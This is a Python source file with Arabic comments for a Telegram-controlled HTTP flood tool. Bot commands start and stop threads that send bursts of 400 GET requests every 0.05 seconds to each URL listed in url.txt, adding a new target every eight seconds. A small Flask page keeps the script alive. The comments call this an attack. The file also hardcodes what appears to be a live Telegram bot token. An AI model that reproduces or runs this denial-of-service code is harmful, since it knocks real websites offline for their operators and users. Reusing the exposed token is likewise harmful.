import threading
import time
import requests
from flask import Flask
from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext

# إعدادات
is_running = False
active_threads = []
url_index = 0
urls = []

# فلـاسـك
app = Flask(__name__)
@app.route("/")
def home():
    return "hello FAILED REQUESTS<br>IMAD213"

def run_flask():
    app.run(host="0.0.0.0", port=5000)

# قراءة الروابط من ملف url.txt
def load_urls():
    with open("url.txt", "r") as f:
        return [line.strip() for line in f if line.strip() and not line.strip().startswith("#")]

# إرسال سريع ومكثف لرابط معين
def attack_url(url):
    while is_running:
        try:
            for _ in range(400):  # إرسال 400 طلب دفعة واحدة
                threading.Thread(target=requests.get, args=(url,), daemon=True).start()
        except:
            pass
        time.sleep(0.05)  # تقليل الانتظار بين الدُفعات

# بدء الإرسال تدريجياً لكل رابط
def gradual_attack():
    global url_index
    while is_running and url_index < len(urls):
        url = urls[url_index]
        thread = threading.Thread(target=attack_url, args=(url,), daemon=True)
        thread.start()
        active_threads.append(thread)
        url_index += 1
        time.sleep(8)  # إضافة رابط جديد كل 8 ثواني

# أمر /start في بوت تلغرام
def start(update: Update, context: CallbackContext):
    global is_running, urls, url_index, active_threads
    if is_running:
        update.message.reply_text("⚠️ الهجوم يعمل بالفعل.")
        return

    urls = load_urls()
    if not urls:
        update.message.reply_text("❌ لم يتم العثور على روابط صالحة في url.txt.")
        return

    is_running = True
    url_index = 0
    active_threads = []
    threading.Thread(target=gradual_attack, daemon=True).start()
    update.message.reply_text("🚀 بدأ الإرسال التدريجي للروابط.")

# أمر /stop في بوت تلغرام
def stop(update: Update, context: CallbackContext):
    global is_running
    if not is_running:
        update.message.reply_text("ℹ️ لا يوجد إرسال نشط.")
        return

    is_running = False
    update.message.reply_text("🛑 تم إيقاف الإرسال.")

# تشغيل البوت وFlask
def main():
    TOKEN = "7774881594:AAGrjc0-ikU-3OMaivzZoYTwajV0jcu8P0Q"  # ← ضع التوكن الخاص بك هنا
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("stop", stop))

    # تشغيل Flask في الخلفية
    threading.Thread(target=run_flask, daemon=True).start()

    # بدء بوت تيليغرام
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
